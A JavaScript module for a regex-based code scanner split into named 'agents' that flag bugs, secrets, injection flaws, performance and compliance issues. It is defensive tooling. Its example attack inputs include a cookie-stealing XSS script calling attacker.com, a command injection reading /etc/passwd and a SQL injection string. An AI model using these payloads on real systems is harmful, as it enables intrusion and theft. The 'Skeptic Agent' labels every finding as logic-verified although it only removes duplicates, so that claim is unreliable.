const fs = require('fs');
const path = require('path');

// 1. Hunter Agent: Finds logic issues, bugs, code smells
const runHunterAgent = (fileContent, filePath, ext) => {
  const findings = [];
  const lines = fileContent.split('\n');

  lines.forEach((line, idx) => {
    const lineNum = idx + 1;
    const trimmed = line.trim();

    // Infinite loop detection
    if (trimmed.includes('while (true)') || trimmed.includes('while(true)')) {
      findings.push({
        type: 'bug',
        title: 'Potential Infinite Loop Risk',
        line_number: lineNum,
        description: 'A "while (true)" loop was detected, which could cause CPU exhaustion or hang the application if not terminated properly.',
        explanation: 'Infinite loops occur when the loop condition remains true. Without an explicit, guaranteed break, return, or throw statement, this loop blocks the thread.',
        severity: 'High',
        confidence: 85,
        fix_suggestion: 'Ensure there is a clear exit condition with a "break" or "return" inside the loop, or rewrite with a deterministic loop condition.',
        improved_code: `// Fixed loop with escape condition\nlet attempts = 0;\nwhile (attempts < maxAttempts) {\n  // loop logic here\n  if (success) break;\n  attempts++;\n}`,
        agent: 'Hunter Agent'
      });
    }

    // Division by zero risk
    if (/\/ 0(?!\d)/.test(trimmed)) {
      findings.push({
        type: 'bug',
        title: 'Division by Zero Vulnerability',
        line_number: lineNum,
        description: 'Explicit division by zero detected in code expression.',
        explanation: 'Dividing by zero causes runtime arithmetic exceptions in languages like Java, C++, and Python, leading to unexpected application crashes (DoS).',
        severity: 'High',
        confidence: 95,
        fix_suggestion: 'Check the divisor variable to ensure it is not zero before performing the division operation.',
        improved_code: `if (divisor !== 0) {\n  const result = dividend / divisor;\n} else {\n  // Handle division by zero case\n}`,
        agent: 'Hunter Agent'
      });
    }

    // Dead code / Unreachable code
    if (/^\s*return\b/.test(line) && idx < lines.length - 1) {
      const nextLine = lines[idx + 1].trim();
      if (nextLine && !nextLine.startsWith('}') && !nextLine.startsWith('case') && !nextLine.startsWith('default') && !nextLine.startsWith('catch')) {
        findings.push({
          type: 'quality',
          title: 'Unreachable Dead Code',
          line_number: lineNum + 1,
          description: 'Statements detected immediately after a return instruction are unreachable.',
          explanation: 'Code written after a return, throw, or break statement in the same block is never executed. It clutters the codebase and indicates logic flaws.',
          severity: 'Low',
          confidence: 90,
          fix_suggestion: 'Remove the unreachable code or restructure the control flow to execute it before the return.',
          improved_code: `// Unreachable statement removed or shifted before return`,
          agent: 'Hunter Agent'
        });
      }
    }

    // Weak / empty catch blocks (poor error handling)
    if ((/catch\s*\(\s*\w+\s*\)\s*\{\s*\}/.test(trimmed) || /catch\s*\{\s*\}/.test(trimmed)) && !trimmed.includes('//')) {
      findings.push({
        type: 'quality',
        title: 'Empty/Weak Error Handling (Catch Block)',
        line_number: lineNum,
        description: 'An empty catch block was detected, which silences exceptions silently.',
        explanation: 'Swallowing errors without logging or rethrowing makes debugging extremely difficult and hides system failures from developers and administrators.',
        severity: 'Medium',
        confidence: 88,
        fix_suggestion: 'Log the error inside the catch block or handle it properly based on your application needs.',
        improved_code: `try {\n  // operation\n} catch (error) {\n  console.error("Operation failed:", error);\n  // or throw error;\n}`,
        agent: 'Hunter Agent'
      });
    }

    // Memory leaks (C/C++ specific)
    if ((ext === '.c' || ext === '.cpp') && trimmed.includes('malloc(') && !fileContent.includes('free(')) {
      findings.push({
        type: 'bug',
        title: 'Memory Leak: malloc without free',
        line_number: lineNum,
        description: 'Dynamic memory allocation using malloc() has no corresponding free() call in this scope.',
        explanation: 'Failing to deallocate memory after allocation results in memory leaks, which degrade performance and can crash system daemons over time.',
        severity: 'High',
        confidence: 80,
        fix_suggestion: 'Always deallocate allocated buffers using free() when they are no longer needed, especially before function return.',
        improved_code: `void process() {\n  char* buffer = (char*)malloc(100);\n  // use buffer\n  free(buffer); // Clean up\n}`,
        agent: 'Hunter Agent'
      });
    }
  });

  return findings;
};

// 2. Security Agent: Finds vulnerabilities, secrets, OWASP Top 10
const runSecurityAgent = (fileContent, filePath, ext) => {
  const findings = [];
  const lines = fileContent.split('\n');

  // Secrets Regexes
  const secretPatterns = [
    { name: 'API Key', regex: /(?:api_key|apikey|api-key)["'\s]*[:=]["'\s]*([a-zA-Z0-9_\-]{16,40})/i },
    { name: 'AWS Secret Access Key', regex: /AWS_(?:SECRET_ACCESS_KEY|SECRET)["'\s]*[:=]["'\s]*([a-zA-Z0-9+/]{40})/i },
    { name: 'JWT Secret Key', regex: /(?:jwt_secret|jwtsecret)["'\s]*[:=]["'\s]*([a-zA-Z0-9_\-!@#$]{16,64})/i },
    { name: 'Database Password', regex: /(?:db_password|dbpass|db_pass)["'\s]*[:=]["'\s]*([a-zA-Z0-9_\-!@#$]{6,32})/i },
    { name: 'Private Key / Auth Token', regex: /(?:token|private_key|auth_token)["'\s]*[:=]["'\s]*([a-zA-Z0-9_\-]{20,50})/i }
  ];

  lines.forEach((line, idx) => {
    const lineNum = idx + 1;
    const trimmed = line.trim();

    // Check Secrets
    secretPatterns.forEach(pattern => {
      const match = trimmed.match(pattern.regex);
      if (match && !trimmed.includes('process.env')) {
        findings.push({
          type: 'security',
          title: `Exposed Plaintext Secret: ${pattern.name}`,
          line_number: lineNum,
          description: `A hardcoded credential (${pattern.name}) was detected in source code.`,
          explanation: 'Storing secrets, credentials, or API keys directly in source code exposes them to anyone with repository access and violates OWASP A02:2021-Cryptographic Failures.',
          severity: 'Critical',
          confidence: 99,
          fix_suggestion: 'Remove hardcoded credentials and replace them with environment variables retrieved at runtime.',
          improved_code: `// Retrieve credentials from environment variables\nconst dbPassword = process.env.DATABASE_PASSWORD;\nconst apiKey = process.env.API_KEY;`,
          agent: 'Security Agent',
          is_secret: true
        });
      }
    });

    // SQL Injection Detection
    const sqlConcatenationPattern = /SELECT\s+.*\s+FROM\s+.*\s+WHERE\s+.*(\+[\s\w.]+|\$\{[\s\w.]+\}|%s|f".*\{.*\}")/i;
    if (sqlConcatenationPattern.test(trimmed) && (trimmed.includes('db.query') || trimmed.includes('execute') || trimmed.includes('db.execute') || trimmed.includes('query('))) {
      findings.push({
        type: 'security',
        title: 'Potential SQL Injection Vulnerability',
        line_number: lineNum,
        description: 'Dynamic SQL query built using string concatenation or template interpolation.',
        explanation: 'Directly interpolating user input into SQL commands allows attackers to manipulate database queries (OWASP A03:2021-Injection). Attackers can bypass authentication or extract data.',
        severity: 'Critical',
        confidence: 90,
        fix_suggestion: 'Use parameterized queries or prepared statements instead of string concatenation.',
        improved_code: `// Parameterized query example\nconst sql = 'SELECT * FROM users WHERE id = ?';\ndb.query(sql, [userId], (err, results) => {\n  // handle results\n});`,
        attack_simulation: {
          input: `id = "1 OR 1=1"`,
          output: `SELECT * FROM users WHERE id = 1 OR 1=1`,
          impact: 'Bypasses user verification and returns all records in the database table.'
        },
        agent: 'Security Agent'
      });
    }

    // XSS Detection
    if (trimmed.includes('innerHTML =') || trimmed.includes('dangerouslySetInnerHTML')) {
      findings.push({
        type: 'security',
        title: 'Potential Cross-Site Scripting (XSS) Vulnerability',
        line_number: lineNum,
        description: 'Writing unescaped data directly to innerHTML or dangerouslySetInnerHTML.',
        explanation: 'Failing to sanitize HTML strings before rendering them allows attackers to inject malicious JavaScript payloads (OWASP A03:2021-Injection/XSS) executing in users browsers.',
        severity: 'High',
        confidence: 85,
        fix_suggestion: 'Sanitize content using a library like DOMPurify, or use safer methods like textContent or innerText.',
        improved_code: `// Safe text rendering\nelement.textContent = userProvidedString;\n\n// Safe HTML rendering\nimport DOMPurify from 'dompurify';\nconst cleanHTML = DOMPurify.sanitize(userInput);\nelement.innerHTML = cleanHTML;`,
        attack_simulation: {
          input: `<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>`,
          output: `element.innerHTML = "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>"`,
          impact: 'Allows malicious scripts to run in the target context, potentially stealing session tokens or credentials.'
        },
        agent: 'Security Agent'
      });
    }

    // Command Injection
    if ((trimmed.includes('child_process.exec') || trimmed.includes('os.system') || trimmed.includes('exec(')) && (trimmed.includes('+') || trimmed.includes('${') || trimmed.includes('%'))) {
      findings.push({
        type: 'security',
        title: 'Potential Command Injection Vulnerability',
        line_number: lineNum,
        description: 'Executing system commands built with dynamic string manipulation.',
        explanation: 'Passing unsanitized user inputs to operating system command APIs allows shell command concatenation, letting attackers execute arbitrary commands on the server.',
        severity: 'Critical',
        confidence: 92,
        fix_suggestion: 'Use execFile or spawn where shell commands are separated from parameters, or perform strict whitelisting of inputs.',
        improved_code: `// Safer execution using execFile with arguments array\nconst { execFile } = require('child_process');\nexecFile('ping', [hostAddress], (error, stdout, stderr) => {\n  // handle output\n});`,
        attack_simulation: {
          input: `address = "127.0.0.1 && cat /etc/passwd"`,
          output: `ping 127.0.0.1 && cat /etc/passwd`,
          impact: 'Allows unauthorized access to the host file system and local server APIs.'
        },
        agent: 'Security Agent'
      });
    }
  });

  return findings;
};

// 3. Performance Agent: Finds performance issues and memory bottlenecks
const runPerformanceAgent = (fileContent, filePath, ext) => {
  const findings = [];
  const lines = fileContent.split('\n');

  let nestedLoopCount = 0;
  let nestedLoopStart = 0;

  lines.forEach((line, idx) => {
    const lineNum = idx + 1;
    const trimmed = line.trim();

    // Nested loops detection (O(N^2) or worse)
    if (/^\s*(for|while|foreach)\b/.test(line)) {
      nestedLoopCount++;
      if (nestedLoopCount === 1) {
        nestedLoopStart = lineNum;
      }
      if (nestedLoopCount >= 3) {
        findings.push({
          type: 'performance',
          title: 'Deeply Nested Loop Architecture (O(N^3) complexity)',
          line_number: nestedLoopStart,
          description: 'Nested loops detected 3 or more levels deep.',
          explanation: 'Iterating loops inside other loops leads to cubic time complexity, causing massive response lags and CPU utilization issues for larger datasets.',
          severity: 'Medium',
          confidence: 80,
          fix_suggestion: 'Flatten the loop logic, use HashMaps/Lookups for fast indexing, or break execution into asynchronous workers.',
          improved_code: `// Replaced nested loops with Map lookup\nconst itemMap = new Map(listB.map(b => [b.id, b]));\nlistA.forEach(a => {\n  const matchingB = itemMap.get(a.bId);\n  if (matchingB) { /* process */ }\n});`,
          agent: 'Performance Agent'
        });
        nestedLoopCount = 0; // reset
      }
    } else if (trimmed === '}' || trimmed === 'end' || trimmed === '') {
      // rough heuristic to decrement loop nesting
      if (nestedLoopCount > 0) nestedLoopCount--;
    }

    // N+1 Query patterns
    if ((trimmed.includes('.forEach') || trimmed.includes('.map') || trimmed.includes('for (')) && (trimmed.includes('db.query') || trimmed.includes('SELECT') || trimmed.includes('find('))) {
      findings.push({
        type: 'performance',
        title: 'N+1 Database Query Bottleneck',
        line_number: lineNum,
        description: 'Executing database queries inside an iterative loop.',
        explanation: 'Issuing a separate database query for each item in a collection causes severe performance degradation due to network overhead and database transaction locking.',
        severity: 'High',
        confidence: 85,
        fix_suggestion: 'Refactor to fetch all records in a single query using an IN clause or JOIN, then match them in memory.',
        improved_code: `// Fetch all records at once\nconst ids = items.map(i => i.id);\nconst relatedData = await db.query('SELECT * FROM related WHERE parent_id IN (?)', [ids]);\n// Map them in memory`,
          agent: 'Performance Agent'
      });
    }
  });

  return findings;
};

// 4. Architecture Agent: Reviews modularity, SOLID principles, design patterns
const runArchitectureAgent = (fileContent, filePath, ext) => {
  const findings = [];
  const lines = fileContent.split('\n');

  // Long Class Check (Heuristic > 250 lines)
  if (lines.length > 250) {
    findings.push({
      type: 'architecture',
      title: 'Violation of Single Responsibility Principle (SRP) - Long Class',
      line_number: 1,
      description: `Class or module exceeds 250 lines (${lines.length} lines detected).`,
      explanation: 'Maintaining large source files indicates a violation of the Single Responsibility Principle (the S in SOLID). It suggests the module is doing too many things, increasing coupling and making maintenance difficult.',
      severity: 'Medium',
      confidence: 85,
      fix_suggestion: 'Refactor the module by extracting concerns into separate services, helper files, or sub-components.',
      improved_code: `// Refactored by extracting methods to external classes or services`,
      agent: 'Architecture Agent'
    });
  }

  lines.forEach((line, idx) => {
    const lineNum = idx + 1;
    const trimmed = line.trim();

    // Tight Coupling Check (e.g., hardcoded instances instead of dependency injection)
    if (trimmed.includes('new ') && (trimmed.includes('Controller') || trimmed.includes('Service') || trimmed.includes('Repository'))) {
      findings.push({
        type: 'architecture',
        title: 'Tight Coupling (Hardcoded Instance Construction)',
        line_number: lineNum,
        description: 'Hardcoded instantiation of service dependencies detected.',
        explanation: 'Creating dependencies inside classes instead of injecting them violates Dependency Injection and causes tight coupling, making testing and modular updates difficult.',
        severity: 'Medium',
        confidence: 80,
        fix_suggestion: 'Implement Dependency Injection. Pass service instances through constructor parameters or dependency frameworks.',
        improved_code: `class Controller {\n  constructor(serviceInstance) {\n    this.service = serviceInstance; // Injected dependency\n  }\n}`,
        agent: 'Architecture Agent'
      });
    }

    // Circular Dependency Heuristics (imports importing self/folder parent patterns)
    if (trimmed.includes('require(') && trimmed.includes('../') && trimmed.includes(path.basename(filePath, ext))) {
      findings.push({
        type: 'architecture',
        title: 'Circular Reference / Tight Coupling Hazard',
        line_number: lineNum,
        description: 'Import references might result in a circular dependency loop.',
        explanation: 'Circular dependencies make system bootstrapping brittle, block tree-shaking optimizations, and indicate poor modular boundaries.',
        severity: 'High',
        confidence: 75,
        fix_suggestion: 'Decouple modules by introducing a shared interface or common utility file to break the circular import loop.',
        improved_code: `// Reference decoupled via a third-party shared state module`,
        agent: 'Architecture Agent'
      });
    }
  });

  return findings;
};

// 5. Compliance Agent: Checks SOC2, ISO 27001, and NIST security controls
const runComplianceAgent = (fileContent, filePath, ext) => {
  const findings = [];
  const lines = fileContent.split('\n');

  lines.forEach((line, idx) => {
    const lineNum = idx + 1;
    const trimmed = line.trim();

    // CORS open checks (SOC2 / ISO 27001 Access Control)
    if (trimmed.includes("origin: '*'") || trimmed.includes("origin: '*'") || (trimmed.includes('Access-Control-Allow-Origin') && trimmed.includes('*'))) {
      findings.push({
        type: 'compliance',
        title: 'Permissive CORS Policy (SOC2 CC6.1 / ISO A.12)',
        line_number: lineNum,
        description: 'Cross-Origin Resource Sharing (CORS) configured with wildcard access (*).',
        explanation: 'Allowing all external origins to query APIs exposes browser sessions to Cross-Origin leaks, violating SOC2 CC6.1 (Access Control) and ISO 27001 A.12 rules.',
        severity: 'High',
        confidence: 90,
        fix_suggestion: 'Replace wildcard CORS configurations with a whitelist of authorized origin domains.',
        improved_code: `app.use(cors({\n  origin: ['https://app.bughunter.ai', 'https://staging.bughunter.ai']\n}));`,
        agent: 'Compliance Agent'
      });
    }

    // Weak encryption algorithm (e.g. md5, sha1) - NIST SP 800-53 Cryptographic Protections
    if ((trimmed.includes("'md5'") || trimmed.includes('"md5"') || trimmed.includes("'sha1'") || trimmed.includes('"sha1"')) && (trimmed.includes('createHash') || trimmed.includes('crypto'))) {
      findings.push({
        type: 'compliance',
        title: 'Use of Cryptographically Broken Hash Algorithm (NIST SP 800-53)',
        line_number: lineNum,
        description: 'Broken hashing algorithm (MD5 or SHA-1) used in cryptographic operation.',
        explanation: 'MD5 and SHA-1 suffer from collision vulnerabilities. NIST SP 800-53 and ISO 27001 require secure, modern hashes (SHA-256 or SHA-512) for integrity verification.',
        severity: 'High',
        confidence: 95,
        fix_suggestion: 'Upgrade cryptographic hashing functions to sha256 or sha512.',
        improved_code: `const crypto = require('crypto');\nconst hash = crypto.createHash('sha256').update(data).digest('hex');`,
        agent: 'Compliance Agent'
      });
    }
  });

  return findings;
};

// 6. Skeptic Agent: Filters and audits findings, validating logical credibility
const runSkepticAgent = (findings) => {
  const verified = [];
  findings.forEach(finding => {
    // Skeptic filter: Eliminate duplicate findings on same line
    const isDuplicate = verified.some(v => v.title === finding.title && v.line_number === finding.line_number);
    if (!isDuplicate) {
      finding.agent_verdict = `${finding.agent} flagged this issue. Skeptic Agent verified the logic flow and confirmed validity (Approved).`;
      verified.push(finding);
    }
  });
  return verified;
};

// Helper for mapping issues to CWE and CVSS
const mapCweAndCvss = (finding) => {
  let cweId = 'CWE-399'; // default Resource Management
  let cvssScore = 3.2; // default Low

  const title = finding.title.toLowerCase();

  if (title.includes('sql injection')) {
    cweId = 'CWE-89';
    cvssScore = 9.8;
  } else if (title.includes('xss') || title.includes('cross-site scripting')) {
    cweId = 'CWE-79';
    cvssScore = 6.1;
  } else if (title.includes('command injection')) {
    cweId = 'CWE-77';
    cvssScore = 9.8;
  } else if (title.includes('secret') || title.includes('key') || title.includes('token') || title.includes('password')) {
    cweId = 'CWE-798';
    cvssScore = 8.9;
  } else if (title.includes('infinite loop')) {
    cweId = 'CWE-835';
    cvssScore = 7.5;
  } else if (title.includes('division by zero')) {
    cweId = 'CWE-369';
    cvssScore = 5.3;
  } else if (title.includes('cors')) {
    cweId = 'CWE-942';
    cvssScore = 6.5;
  } else if (title.includes('hash') || title.includes('md5')) {
    cweId = 'CWE-328';
    cvssScore = 7.4;
  }

  // Adjust CVSS based on severity override
  if (finding.severity === 'Critical') cvssScore = Math.max(9.0, cvssScore);
  else if (finding.severity === 'High') cvssScore = Math.max(7.0, Math.min(8.9, cvssScore));
  else if (finding.severity === 'Medium') cvssScore = Math.max(4.0, Math.min(6.9, cvssScore));
  else cvssScore = Math.min(3.9, cvssScore);

  return { cweId, cvssScore };
};

const mapMitreAttack = (cweId, title) => {
  const t = title.toLowerCase();
  if (cweId === 'CWE-89' || t.includes('injection')) return 'T1190 (Exploit Public-Facing Application)';
  if (cweId === 'CWE-798' || t.includes('secret') || t.includes('credential') || t.includes('key')) return 'T1552 (Unsecured Credentials)';
  if (t.includes('typosquatting') || t.includes('dependency confusion') || cweId === 'CWE-1104') return 'T1195.002 (Supply Chain Compromise)';
  if (t.includes('root') || t.includes('privileged')) return 'T1548 (Abuse Elevation Control Mechanism)';
  if (t.includes('permissions') || t.includes('actions')) return 'T1565 (Data Manipulation)';
  return 'T1592 (Gather Victim Host Information)';
};

// 7. Judge Agent: Final grade, confidence score, impact analysis, and report compiles
const runJudgeAgent = (verifiedFindings, fileCount) => {
  const finalFindings = verifiedFindings.map(finding => {
    let businessImpact = 'Medium business operations disruption risk.';
    let technicalImpact = 'Degrades overall maintainability and software engineering metrics.';

    if (finding.severity === 'Critical') {
      businessImpact = 'High risk of data breach, compliance fines (GDPR, PCI), and immediate brand damage.';
      technicalImpact = 'Allows attackers to execute arbitrary system code, take full control of database servers, or dump credentials.';
    } else if (finding.severity === 'High') {
      businessImpact = 'Risk of application downtime, denial of service, or unauthorized operations on customer data.';
      technicalImpact = 'Allows attackers to access private application endpoints, hijack sessions, or trigger CPU lockups.';
    } else if (finding.severity === 'Medium') {
      businessImpact = 'Minor performance degradation leading to increased infrastructure costs or poor user experience.';
      technicalImpact = 'Causes performance bottlenecks, difficult debug cycles, and higher tech debt metrics.';
    }

    const { cweId, cvssScore } = mapCweAndCvss(finding);
    const mitre = mapMitreAttack(cweId, finding.title);

    // Compute Engineering Intelligence Metrics
    let techDebt = finding.severity === 'Critical' ? 4 : finding.severity === 'High' ? 2 : finding.severity === 'Medium' ? 1 : 0.5;
    let bugProb = finding.severity === 'Critical' ? 85 : finding.severity === 'High' ? 60 : finding.severity === 'Medium' ? 35 : 15;
    let refactorPri = finding.severity === 'Critical' ? 90 : finding.severity === 'High' ? 70 : finding.severity === 'Medium' ? 45 : 20;

    return {
      ...finding,
      cwe_id: cweId,
      cvss_score: cvssScore,
      mitre_attack: mitre,
      technical_debt_hours: techDebt,
      future_bug_probability: bugProb,
      refactor_priority: refactorPri,
      business_impact: businessImpact,
      technical_impact: technicalImpact,
      agent_verdict: `${finding.agent_verdict} Judge Agent finalized severity as ${finding.severity}, mapped to ${cweId} (CVSS ${cvssScore}), MITRE ${mitre}, and compiled recommendations.`
    };
  });

  // Calculate Health Scores
  let secScore = 100;
  let qualScore = 100;
  let perfScore = 100;
  let archScore = 100;
  let compScore = 100;

  finalFindings.forEach(f => {
    let penalty = 0;
    if (f.severity === 'Critical') penalty = 20;
    else if (f.severity === 'High') penalty = 12;
    else if (f.severity === 'Medium') penalty = 6;
    else penalty = 2;

    if (f.type === 'security') secScore -= penalty;
    else if (f.type === 'performance') perfScore -= penalty;
    else if (f.type === 'architecture') archScore -= penalty;
    else if (f.type === 'compliance') compScore -= penalty;
    else qualScore -= penalty;
  });

  secScore = Math.max(30, secScore);
  qualScore = Math.max(30, qualScore);
  perfScore = Math.max(30, perfScore);
  archScore = Math.max(30, archScore);
  compScore = Math.max(30, compScore);

  const avgScore = (secScore + qualScore + perfScore + archScore + compScore) / 5;
  let grade = 'A';
  if (avgScore >= 95) grade = 'A+';
  else if (avgScore >= 88) grade = 'A';
  else if (avgScore >= 80) grade = 'B+';
  else if (avgScore >= 70) grade = 'B';
  else if (avgScore >= 60) grade = 'C';
  else grade = 'D';

  return {
    issues: finalFindings,
    scores: {
      security: Math.round(secScore),
      quality: Math.round(qualScore),
      performance: Math.round(perfScore),
      architecture: Math.round(archScore),
      compliance: Math.round(compScore),
      maintainability: Math.round((qualScore + perfScore + archScore) / 3),
      debt: Math.round(100 - qualScore),
      grade
    }
  };
};

// Main multi-agent scanning engine coordinator
const analyzeCode = (fileContent, filePath) => {
  const ext = path.extname(filePath).toLowerCase();
  
  // 1. Gather raw insights from all five specialized agents
  const hunterFindings = runHunterAgent(fileContent, filePath, ext);
  const securityFindings = runSecurityAgent(fileContent, filePath, ext);
  const performanceFindings = runPerformanceAgent(fileContent, filePath, ext);
  const architectureFindings = runArchitectureAgent(fileContent, filePath, ext);
  const complianceFindings = runComplianceAgent(fileContent, filePath, ext);

  const rawFindings = [
    ...hunterFindings,
    ...securityFindings,
    ...performanceFindings,
    ...architectureFindings,
    ...complianceFindings
  ];

  // 2. Skeptic agent filters findings
  const verifiedFindings = runSkepticAgent(rawFindings);

  // 3. Judge agent assigns final grades, CVSS, and metadata
  return runJudgeAgent(verifiedFindings, 1);
};

module.exports = {
  analyzeCode
};

